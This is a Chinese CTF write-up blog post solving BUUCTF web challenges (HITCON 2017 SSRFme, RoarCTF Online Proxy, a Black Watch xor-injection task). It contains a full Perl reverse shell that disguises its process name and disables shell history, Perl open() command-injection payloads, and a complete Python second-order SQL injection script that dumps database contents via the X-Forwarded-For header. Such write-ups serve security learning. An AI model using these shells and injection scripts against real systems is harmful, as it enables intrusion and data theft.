<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="BUUCTF-web刷题Ⅲ"><meta name="keywords" content="CTF,web,RCE,SSRF,二次注入,perl下利用open命令进行RCE,XFF注入"><meta name="author" content="ggb0n"><meta name="copyright" content="ggb0n"><title>BUUCTF-web刷题Ⅲ | ggb0n's Blog</title><link rel="shortcut icon" href="/avatar.jpg"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-2017-SSRFme"><span class="toc-number">1.</span> <span class="toc-text">[HITCON 2017]SSRFme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用CVE-2016-1238"><span class="toc-number">1.1.1.</span> <span class="toc-text">利用CVE-2016-1238</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用perl的open命令进行SSRF"><span class="toc-number">1.1.2.</span> <span class="toc-text">利用perl的open命令进行SSRF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Online-Proxy"><span class="toc-number">2.</span> <span class="toc-text">[RoarCTF 2019]Online Proxy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解题"><span class="toc-number">2.1.</span> <span class="toc-text">解题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Black-Watch-入群题-Web"><span class="toc-number"></span> <span class="toc-text">[Black Watch 入群题]Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-1"><span class="toc-number">0.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题脚本"><span class="toc-number">0.2.</span> <span class="toc-text">解题脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-encode-and-encode"><span class="toc-number">1.</span> <span class="toc-text">[HarekazeCTF2019]encode_and_encode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-2"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-1"><span class="toc-number">1.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019-Easyweb"><span class="toc-number">2.</span> <span class="toc-text">[CISCN 2019]Easyweb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-3"><span class="toc-number">2.1.</span> <span class="toc-text">题目分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">3.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-4"><span class="toc-number">3.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-2"><span class="toc-number">3.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2018-GetShell"><span class="toc-number">4.</span> <span class="toc-text">[SUCTF 2018]GetShell</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://www.ggb0n.cool/images/avatar.jpg"></div><div class="author-info__name text-center">ggb0n</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">18</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">78</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">8</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Friends Links</div><a class="author-info-links__name text-center" href="https://f61d.github.io" target="_blank" rel="noopener">f61d</a><a class="author-info-links__name text-center" href="https://15h3na0.xyz" target="_blank" rel="noopener">15h3na0</a><a class="author-info-links__name text-center" href="https://sxadmin.github.io" target="_blank" rel="noopener">Myself'</a><a class="author-info-links__name text-center" href="https://diao-diaoupup.cn" target="_blank" rel="noopener">51nd0re1</a><a class="author-info-links__name text-center" href="http://caoyi.site" target="_blank" rel="noopener">Amateur</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/ph1sh" target="_blank" rel="noopener">ph1sh</a></div></div></div><div id="content-outer"><div class="plain" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">ggb0n's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/links">Friend links</a><a class="site-page" href="/about">About</a><a class="site-page" href="/tools">Tools</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div></div><div class="layout" id="content-inner"><article id="post"><div class="plain" id="post-title">BUUCTF-web刷题Ⅲ</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-15</time><span class="post-meta__separator">|</span><i class="fa fa-inbox" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"> CTF学习记录</a><i class="fa fa-angle-right post-meta__separator" aria-hidden="true"></i><i class="fa fa-inbox" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/"> BUU刷题</a><span class="post-meta__separator">|</span><span class="post-meta-wordcount"><span>Word count: </span><span class="word-count">6k</span><span class="post-meta__separator">|</span><span>Reading time: 23 min</span></span></div><div class="article-container" id="post-content"><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>主要考察<code>Perl</code>下存在的漏洞：<a href="https://nvd.nist.gov/vuln/detail/CVE-2016-1238" target="_blank" rel="noopener">CVE-2016-1238</a>和<code>open</code>命令导致命令执行的漏洞。利用此漏洞进行SSRF。</p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，给出了如下的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]); </span><br><span class="line">    @mkdir($sandbox); </span><br><span class="line">    @chdir($sandbox); </span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>])); </span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]); </span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>])); </span><br><span class="line">    @mkdir($dir); </span><br><span class="line">    @chdir($dir); </span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data); </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>同时也给出了<code>REMOTE_ADDR</code>，这在后面解题用得到。<br>分析代码我们可以梳理出其逻辑：</p>
<blockquote>
<p>1.基于<code>REMOTE_ADDR</code>创建沙箱文件夹；<br>2.将传入的URL带入命令<code>GET</code>执行。这里的<code>GET</code>命令是<a href="https://blog.csdn.net/ace_fei/article/details/7258700" target="_blank" rel="noopener">Lib for WWW in Perl</a>中的命令，目的是模拟<code>http</code>的<code>GET</code>请求；<br>3.利用<a href="https://www.runoob.com/php/func-filesystem-pathinfo.html" target="_blank" rel="noopener">pathinfo函数</a>解析传入的<code>filename</code>参数，获取路径名最后一层文件夹创建并进入该路径；<br>4.利用<a href="https://www.runoob.com/php/func-filesystem-basename.html" target="_blank" rel="noopener">basename函数</a>获取<code>filename</code>传参内容的最后以及文件夹名称；<br>5.利用​<a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html" target="_blank" rel="noopener">file_put_contents函数</a>将<code>GET</code>命令执行的结果写入以<code>filename</code>中的文件名命名的文件中。</p>
</blockquote>
<p>这一道题涉及的知识之前没遇到过，需要好好学一学，参考网上的题解得知有两种解题思路：</p>
<ul>
<li>利用<code>Perl5</code>的一个CVE</li>
<li>利用<code>Perl</code>的<code>open</code>命令进行命令执行</li>
</ul>
<h4 id="利用CVE-2016-1238"><a href="#利用CVE-2016-1238" class="headerlink" title="利用CVE-2016-1238"></a>利用CVE-2016-1238</h4><p>漏洞大致构成原因是：`</p>
<blockquote>
<p>当解析遇到了非定义的协议(定义的协议在<code>perl5/LWP/Protocol</code>文件夹下可以看到，默认支持<code>GHTTP</code>、<code>cpan</code>、<code>data</code>、<code>file</code>、<code>ftp</code>、<code>gopher</code>、<code>http</code>、<code>https</code>、<code>loopback</code>、<code>mailto</code>、<code>nntp</code>、<code>nogo</code>协议)时, 如<code>GGBON://ggb0n.com</code>，会自动读取当前目录下的URI目录并查看是否有对应协议的<code>pm模块</code>并尝试<code>eval &quot;require xxx&quot;</code>，这里我们的恶意pm模块就会被执行。</p>
</blockquote>
<p>借此漏洞构造一个反弹shell的perl脚本放到自己的VPS上：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any </span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(^127\.0\.0\.1$);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Declarations</span></span><br><span class="line"><span class="string">my $global_page = "";</span></span><br><span class="line"><span class="string">my $fake_process_name = "/usr/sbin/apache";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="string">$0 = "[httpd]";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="string">if (defined($ENV&#123;'REMOTE_ADDR'&#125;)</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">"&lt;p&gt;\n"</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r Connection: close\r Content-Type: text\/html\r\n\r\n"</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后利用代码的逻辑构造payload：</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">/?<span class="attr">url=your</span> vps's perl backdoor&amp;<span class="attr">filename=URI/ggb0n.pm</span></span><br></pre></td></tr></table></figure>
<p>这就在沙箱文件夹的URL下写入了反弹shell的pm文件，最后在个人的VPS上监听pm文件中写好的端口并构造如下的payload进行访问：</p>
<figure class="highlight qml"><table><tr><td class="code"><pre><span class="line">/?<span class="built_in">url</span>=<span class="attribute">GGBON</span>:<span class="comment">//ggb0n.com&amp;filename=xxx</span></span><br></pre></td></tr></table></figure>
<p>即可拿到shell。<br>注意：这里的<code>GGBON</code>可以为任意的不属于上面说到的可以解析的字符串。</p>
<h4 id="利用perl的open命令进行SSRF"><a href="#利用perl的open命令进行SSRF" class="headerlink" title="利用perl的open命令进行SSRF"></a>利用perl的open命令进行SSRF</h4><p>首先扩展一下<code>open</code>命令导致命令执行的过程，参考网上的资料：</p>
<blockquote>
<p>Executing Programs with “open”<br>In addition to what we saw last week, the “open” command has one more very<br>powerful application: it allows you to execute a command, send input and<br>receive output.<br>Try this program (it only works on Unix):</p>
</blockquote>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line">  <span class="keyword">use</span> strict;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">open</span> DATA, <span class="string">"who |"</span>   <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"Couldn't execute program: $!"</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="keyword">defined</span>( <span class="keyword">my</span> $line = &lt;DATA&gt; )  ) &#123;</span><br><span class="line">    <span class="keyword">chomp</span>($line);</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$line\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">close</span> DATA;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Here’s what happened: Perl saw that your “file” ended with a “pipe” (verticalbar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”‘s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you.</p>
<p>In this case, we “read” data from the command. To execute a command that we can “write” (send data) to, we should place a pipe character BEFORE the command. These options are mutually exclusive: we can read from a command or write to it, but not both.</p>
<p>In the Unix world, a lot can be done by piping the output of one program into the input of another. Perl continues this spirit.</p>
<p>Note that we can also send command-line parameters to the command, like this:</p>
</blockquote>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">open DATA, <span class="string">"who -H |"</span>    <span class="keyword">or </span><span class="keyword">die </span><span class="string">"Couldn't execute program: $!"</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>In fact, Perl allows you to use “open” to do pretty much anything you would normally do on the command-line, as this example demonstrates:</p>
</blockquote>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span> <span class="literal">OUTPUT</span>, <span class="string">"| grep 'foo' &gt; result.txt"</span>     <span class="keyword">or</span> die <span class="string">"Failure: $!"</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>We can then write whatever we want to the “OUTPUT” filehandle. The Unix “grep” command will filter out any text which doesn’t contain the text “foo”; any text which DOES contain “foo” will be written to “result.txt”.</p>
</blockquote>
<p>perl下open命令的feature代码处理file协议的代码在<code>perl5/LWP/Protocol/file.pm</code>下：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">#第47行</span></span><br><span class="line">    <span class="comment"># test file exists and is readable</span></span><br><span class="line">    <span class="keyword">unless</span> (-e $path) &#123;</span><br><span class="line">    <span class="keyword">return</span> HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND,</span><br><span class="line">                  <span class="string">"File `$path' does not exist"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unless</span> (-r <span class="number">_</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> HTTP::Response-&gt;new( &amp;HTTP::Status::RC_FORBIDDEN,</span><br><span class="line">                  <span class="string">'User does not have read permission'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">#第127行</span></span><br><span class="line">    <span class="comment"># read the file</span></span><br><span class="line">    <span class="keyword">if</span> ($method <span class="keyword">ne</span> <span class="string">"HEAD"</span>) &#123;</span><br><span class="line">    <span class="keyword">open</span>(F, $path) <span class="keyword">or</span> <span class="keyword">return</span> new</span><br><span class="line">        HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">               <span class="string">"Cannot read file '$path': $!"</span>);</span><br><span class="line">    <span class="keyword">binmode</span>(F);</span><br><span class="line">    $response =  $self-&gt;collect($arg, $response, <span class="function"><span class="keyword">sub</span> </span>&#123;</span><br><span class="line">        <span class="keyword">my</span> $content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">my</span> $bytes = <span class="keyword">sysread</span>(F, $content, $size);</span><br><span class="line">        <span class="keyword">return</span> \$content <span class="keyword">if</span> $bytes &gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> \ <span class="string">""</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">close</span>(F);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件, 所以先请求：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">url</span>=file:bash -c /readflag|&amp;<span class="attribute">filename</span>=bash -c /readflag|</span><br></pre></td></tr></table></figure>
<p>然后请求如下的payload来创建相应的同名文件：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">url</span>=file:bash -c /readflag|&amp;<span class="attribute">filename</span>=123</span><br></pre></td></tr></table></figure>
<p>最后利用open的feature执行代码访问<code>/sandbox/哈希值/123</code>就能得到flag。</p>
<p>其实还不是很懂，先留在这，再慢慢学习。</p>
<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>XFF处存在二次注入</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入题目查看源码发现：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Debug Info: </span></span><br><span class="line"><span class="comment"> Duration: 0.029144048690796 s </span></span><br><span class="line"><span class="comment"> Current Ip: 174.0.81.45  --&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里提示当前的IP，想到利用工具改一下XFF试试，结果发现回显如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;!--</span> <span class="attr">Debug Info:</span> </span><br><span class="line"> <span class="attr">Duration:</span> <span class="number">0.035063982009888</span> <span class="string">s</span> </span><br><span class="line"> <span class="attr">Current Ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> </span><br><span class="line"><span class="attr">Last Ip:</span> <span class="number">174.0</span><span class="number">.81</span><span class="number">.45</span> <span class="string">--&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明了上一个IP被记录了起来，当然也只能是记录在数据库中，那么如果构造一个SQL注入语句的XFF头上传，然后再随便换一个XFF头访问，不就是可以出发二次注入了吗，最终用赵师傅的脚本跑出了结果。<br>参考赵师傅的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">"http://node3.buuoj.cn:28041/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[*]请求语句："</span> + sql)</span><br><span class="line">    return_result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"0'|length(("</span> + sql + <span class="string">"))|'0"</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">    end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">    length = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">    print(<span class="string">"[+]长度："</span> + str(length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        payload = <span class="string">"0'|conv(hex(substr(("</span> + sql + <span class="string">"),"</span> + str(i) + <span class="string">",5)),16,10)|'0"</span></span><br><span class="line"></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;) <span class="comment"># 将语句注入</span></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)    <span class="comment"># 查询上次IP时触发二次注入</span></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)    <span class="comment"># 再次查询得到结果</span></span><br><span class="line">        start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">        end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">        result = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">        return_result += bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[+]位置 "</span> + str(i) + <span class="string">" 请求五位成功:"</span> + bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库表</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库表</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表中内容</span></span><br><span class="line">print(<span class="string">"[+]获取成功："</span> + execute_sql(<span class="string">"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"</span>))</span><br></pre></td></tr></table></figure>

<h1 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h1><p>考察异或注入</p>
<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目看到如下的界面：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web95.png" alt=""><br>点击热点列表里面的字的时候会跳转到另一个页面，同时还有登录页面，起初猜测是注入是在登录页面，那里通过JSON对username和password进行传参，前面做了JSON中进行注入的题目，但是这道题的注入点其实是在跳转的那个页面，抓包可以发现：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web94.png" alt=""><br>这个页面是利用<code>GET</code>方式直接进行<code>id</code>传参的，存在注入的可能性更大，后来印证是异或注入，用脚本跑。</p>
